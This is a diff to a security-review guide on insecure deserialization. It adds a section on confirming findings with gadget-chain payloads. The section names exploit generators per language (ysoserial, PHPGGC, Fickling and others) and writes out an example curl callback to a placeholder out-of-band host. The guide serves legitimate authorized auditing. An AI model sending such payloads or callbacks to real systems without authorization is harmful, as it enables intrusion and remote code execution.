@@ -145,6 +145,18 @@ For each finding, trace the complete data flow:
 - **Sink**: Which deserialization method processes it? (`parseObject`, `readObject`, `fromXML`, `load`)
 - **Impact**: What can the attacker achieve? (RCE via gadget chains, DoS via resource exhaustion, data tampering)
 
+### Confirming a Finding (gadget-chain payloads)
+
+To prove exploitability of a deserialization sink, generate a language-appropriate gadget-chain payload and observe an out-of-band signal (DNS/HTTP callback to an OAST host) before attempting RCE:
+
+- **Java native** (`ObjectInputStream`) — `ysoserial` (CommonsCollections, Spring, ROME, C3P0 chains depending on classpath); JVM marshallers via `marshalsec`.
+- **.NET** (`BinaryFormatter`, `TypeNameHandling`) — `ysoserial.net`.
+- **PHP** (`unserialize`) — `PHPGGC` (framework-specific chains: Laravel, Symfony, Monolog, etc.).
+- **Python** (`pickle`/`PyYAML`) — craft a `__reduce__` payload (e.g. via `Fickling`) that triggers a benign OAST callback.
+- **Node** (`node-serialize`) — IIFE payload in the serialized `_$$ND_FUNC$$_` field.
+
+Use a harmless callback (`curl http://YOUR-COLLABORATOR.oast.fun/deser`) as the gadget action first; only escalate to command execution with authorization.
+
 ## Severity Assessment
 
 | Scenario | Severity | CVSS Range |
